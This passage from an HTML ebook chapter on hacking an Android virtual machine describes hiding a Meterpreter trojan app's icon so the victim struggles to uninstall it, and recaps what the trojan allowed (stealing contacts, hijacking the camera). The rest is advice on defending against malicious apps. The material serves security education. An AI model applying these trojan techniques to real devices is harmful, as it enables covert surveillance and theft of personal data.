				Switch back to your Android VM, click the home button, and swipe up to show your apps. The MainActivity app will disappear from the list, as shown in <a href="#figure9-10" id="figureanchor9-10">Figure 9-10</a>.</p>
			<figure>
				<img alt="f09010" class="" src="image_fi/502000c09/f09010.png"/>
				<figcaption>
					<p><a id="figure9-10">Figure 9-10</a>: Hiding our MainActivity app icon from the user’s screen</p>
				</figcaption>
			</figure>
			<p>
				By hiding the app icon, we’ve made it difficult for the user to uninstall the trojan app. If an attacker hides the app icon at the very beginning, the user might not even know the trojan app had been installed! The user can still uninstall the trojan app, however, even if they can’t see it. Go to <b>Settings</b><span class="MenuArrow">▶</span><b>App info</b>, click <b>MainActivity</b>, and click <b>Uninstall</b>. Notice that stopping or uninstalling the app closes the Meterpreter session in the Kali VM. To reinstall the trojan app, go to your <em>Downloads</em> folder in Android and click the <em>CoolGame.apk</em> file like we did earlier.</p>
			<h2 id="h1-502000c09-0005"><span epub:type="pagebreak" id="Page_122" title="122"/>Defending Against Malicious Apps</h2>
			<p class="BodyFirst">To protect yourself from malicious apps, be careful about which apps you allow onto your smartphone. In short, think before you install! Use Google Play Protect on your Android device and view each security pop-up as a chance to reconsider what you’re doing. Even better, don’t download apps over the web or outside the Google Play Store, Apple’s App Store (if you’re on an iPhone), or your smartphone manufacturer’s store.</p>
			<p>
				Malicious apps can make it into official app stores, though. That’s why it’s important to read which permissions an app is requesting when you install it. A game or simple app shouldn’t need access to your contacts, call logs, or text messages, and other than augmented-reality or location-based apps like <em>Pokémon Go</em>, an app shouldn’t require your location. If an app asks for more permissions than you think it should need, delete it and find one that does what you want with fewer permissions. Similarly, if an app you’ve installed ever asks for additional permissions—especially if it asks for superuser access—you can cancel the request or even delete the app. You <em>never </em>have to give more permission to an app than you want to, and most apps function perfectly well without being granted extensive permissions.</p>
			<p>If you ever see apps opening on your smartphone that you didn’t open (like when we used Meterpreter to open YouTube on the Android VM), turn your smartphone off completely (don’t just turn off the screen). Press the power button on the side or top of the phone along with the volume up button for several seconds until the screen goes black (this works on most Android devices), or search (using a different device) for how to reboot or reset your specific device. It might also be a good idea to install a security app if you spot any suspicious activity on your smartphone or tablet. There are free or low-cost antivirus apps for most mobile devices that can detect malicious processes or communications if your smartphone ever gets hacked through an app.</p>
			<p>Finally, just like on your desktop or laptop, don’t click suspicious links in emails or text messages. You can use VirusTotal to check most links by copying and pasting, just like you can on a desktop, but on your smartphone, you need to be even more careful about clicking malicious links. Remember, an attacker can access a lot of personal information (and even track your location!) if they’re able to trick you into clicking a bad link or installing a malicious app. So tell your friends, your family members, and other people you care about to be suspicious of any links they get via text message or email and to think before they install an app, especially if it’s from an unknown source.</p>
			<h2 id="h1-502000c09-0006">The Takeaway</h2>
			<p class="BodyFirst">In this chapter, you created an Android virtual machine that looks and works just like a real Android smartphone or tablet. You used Metasploit to create a Meterpreter remote access trojan for Android, almost exactly the same way you did for Windows 10 in Chapter 6, and you installed and launched the trojan on the Android VM. Once you gained control of the <span epub:type="pagebreak" id="Page_123" title="123"/>Android device, you saw how an attacker can run apps, steal contacts, upload and download files, hijack your camera, and snoop around in your search history.</p>
			<p>You also learned that the best way to defend your mobile devices from malware is to avoid installing untrusted apps. Even if an app looks legitimate, delete or uninstall it if the app asks for more permissions than it needs. If your smartphone starts acting weird, reboot it, delete all suspicious apps, and consider installing a security app like an antivirus scanner if you suspect you accidentally installed malware.</p>
			<p>In the next chapter, you’ll try one last hacking activity. You’ll see that hacking doesn’t apply just to computers, smartphones, and tablets. You can also use the tools in your Kali Linux VM to hack other network-connected devices in the world around you, from smart TVs to video game consoles and beyond. To prove it, we’ll hack a car!</p>
		</section>
	</body>
</html>